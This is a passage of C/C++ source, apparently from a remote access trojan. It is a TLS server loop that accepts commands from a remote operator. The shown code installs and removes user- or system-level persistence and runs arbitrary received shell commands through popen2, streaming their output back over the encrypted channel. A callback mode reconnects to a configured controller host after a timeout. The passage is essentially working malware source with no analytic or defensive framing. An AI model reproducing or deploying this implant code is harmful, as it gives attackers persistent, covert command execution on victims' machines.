                                if (isPersistent(path) == 2)
                                {
                                    strncpy((char*)compress.orig_buffer, "Persistent as system", 21);
                                    compress.orig_size = 20;
                                }
                                else
                                {
                                    strncpy((char*)compress.orig_buffer, "Persistence failed", 19);
                                    compress.orig_size =  18;
                                }
                            }
                            else
                            {
                                strncpy((char*)compress.orig_buffer, "Already persistent", 19);
                                compress.orig_size = 18;
                            }

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("install user", (char*)compress.transformed_buffer, 12) == 0) {
                            // install user persistence

                            char path[PATH_MAX + 1];
                            memset(path, 0, PATH_MAX + 1);
                            #ifdef __APPLE__
                            uint32_t size = PATH_MAX;
                            _NSGetExecutablePath(path, &size);
                            #else
                            readlink("/proc/self/exe", path, PATH_MAX);
                            #endif

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                            if (isPersistent(path) == 0)
                            {
                                installPersistence(path, User);

                                if (isPersistent(path) == 1)
                                {
                                    strncpy((char*)compress.orig_buffer, "Persistent as user", 19);
                                    compress.orig_size = 18;
                                }
                                else
                                {
                                    strncpy((char*)compress.orig_buffer, "Persistence failed", 19);
                                    compress.orig_size =  18;
                                }
                            }
                            else
                            {
                                strncpy((char*)compress.orig_buffer, "Already persistent", 19);
                                compress.orig_size = 18;
                            }

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("uninstall user", (char*)compress.transformed_buffer, 14) == 0) {
                            char path[PATH_MAX + 1];
                            memset(path, 0, PATH_MAX + 1);

                            #ifdef __APPLE__
                            uint32_t size = PATH_MAX;
                            _NSGetExecutablePath(path, &size);
                            #else
                            readlink("/proc/self/exe", path, PATH_MAX);
                            #endif

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            removePersistence(path, User);
                            strncpy((char*)compress.orig_buffer, "User persistence removed", 25);
                            compress.orig_size = 24;

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }
                        if (strncmp("uninstall system", (char*)compress.transformed_buffer, 16) == 0) {
                            char path[PATH_MAX + 1];
                            memset(path, 0, PATH_MAX + 1);

                            #ifdef __APPLE__
                            uint32_t size = PATH_MAX;
                            _NSGetExecutablePath(path, &size);
                            #else
                            readlink("/proc/self/exe", path, PATH_MAX);
                            #endif

                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            removePersistence(path, System);
                            strncpy((char*)compress.orig_buffer, "System persistence removed", 27);
                            compress.orig_size = 26;

                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            continue;
                        }

                        char* command = (char*)malloc(17000);
                        command[0] = '\0';

                        if (!command)
                            continue;
                        else
                        {
                            strncat(command, "( cd ", 6);
                            strncat(command, path, strlen(path));
                            strncat(command, "; ", 3);
                            strncat(command, (char*)compress.transformed_buffer, strlen((char*)compress.transformed_buffer));
                            strncat(command, " 2>&1 )", 8);

                            printf("\nCOMMAND: %s\n", command);
                            //free(command);
                        }

                        int pid = -1;

                        fp = popen2(command, "r", &pid);
                        //fp = popen(strncat((char*)compress.transformed_buffer, " 2>&1 ", 6), "r");
                        if (fp == NULL) {
                            #ifdef DEBUG
                            printf("Failed to run command\n");
                            #endif
                        }

                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);

                        struct timeval tv;
                        time_t begin_time, end_time;
                        gettimeofday(&tv, NULL); 
                        begin_time = tv.tv_sec;

                        unsigned char isExpired = 0;
                        while (!isExpired && (compress.orig_size = fread_timeout((char*)compress.orig_buffer, 1, BUFFER_SIZE, fp, timeout)) > 0) {
                            #ifdef DEBUG
                            printf("%s", compress.orig_buffer);
                            #endif
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            had_output = 1;

                            gettimeofday(&tv, NULL);
                            end_time = tv.tv_sec;

                            if ((long unsigned int)(end_time - begin_time) > timeout)
                            {
                                isExpired = 1;
                            }
                        }
                        if (compress.orig_size == 0 && had_output == 0) {
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress.orig_size = strlen(empty_return);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1) {
                                perror("Error Sending");
                            }
                        }
                        had_output = 0;

                        pclose2(fp, pid);
                        free(command);
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                    }
                }
            }
        } // end of loop through pollable descriptors
    } //while loop

Cleanup:
    /*************************************************************/
    /* Clean up all of the sockets that are open
    *************************************************************/

    for (i = 0; i < nfds; i++) {
        if (fds[i].fd >= 0) {
            close(fds[i].fd);
        }
    }

    client_conn = listen_conn->next;
    while (client_conn != NULL) {
        clean_helper = client_conn;
        mbedtls_ssl_free( &client_conn->ssl_fd );
        mbedtls_net_free( &client_conn->conn_fd );
        client_conn = client_conn->next;
        free(clean_helper);
    }
    mbedtls_ssl_free( &listen_conn->ssl_fd );
    mbedtls_net_free( &listen_conn->conn_fd );
    free(listen_conn);

    mbedtls_x509_crt_free( &srvcert );
    mbedtls_pk_free( &pkey );
    mbedtls_ssl_config_free( &conf );
    mbedtls_ctr_drbg_free( &ctr_drbg );
    mbedtls_entropy_free( &entropy );

    // if env_host is set, this was started in callback mode. Wait for timeout, and attempt reconnection
    
    if (env_host != "" && !isKill)
    {
        long _timeout = 0;
        {
            std::lock_guard<std::mutex> guard(callback_mutex);
            for (auto &config : callback_list)
            {
                if (std::get<0>(config) == callback_ip && std::get<1>(config) == callback_port)
                {
                    _timeout = std::get<2>(config);
                    break;
                }
            }
        }
        if (_timeout >= 0 )
        {
            std::this_thread::sleep_for(std::chrono::seconds(_timeout));
            printf("Restarting after %ld\n", _timeout);
            goto restart;
        }
        else
            cleanup_rat_callback(callback_ip, callback_port);
    }

    free(compress.orig_buffer);
    free(compress.transformed_buffer);

    return 0;
}

void add_client(struct ssl_conn **head, struct ssl_conn **client_conn)
{
    struct ssl_conn *current = *head;
    *client_conn = (struct ssl_conn*)malloc (sizeof(struct ssl_conn));
    if (client_conn == NULL) {
        perror("Failed client malloc");
    }
    memset((*client_conn), 0, sizeof(struct ssl_conn));
    mbedtls_net_init( &(*client_conn)->conn_fd );
    mbedtls_ssl_init( &(*client_conn)->ssl_fd );
    (*client_conn)->next = NULL;

    if ((*head)->next == NULL) {
        (*head)->next = *client_conn;
        //printf("added at beginning\n");
    } else {
        while (current->next != NULL) {
            current = current->next;
            //printf("added later\n");
        }
        current->next = *client_conn;
    }
    return;
}

void client_disconnect(struct ssl_conn **head, struct pollfd *fds, int fd, int *nfds)
{
    struct ssl_conn *current = (*head)->next;
    struct ssl_conn *previous = *head;
    while (current != NULL && previous != NULL) {
        if (current->conn_fd.fd == fd) {
            close(fds->fd);
            fds->fd = (fds+1)->fd;
            (*nfds)--;
            previous->next = current->next;
            mbedtls_ssl_free(&current->ssl_fd);
            mbedtls_net_free(&current->conn_fd);
            free(current);
            return;
        }
        previous = current;
        current = current->next;
    }
    return;
}
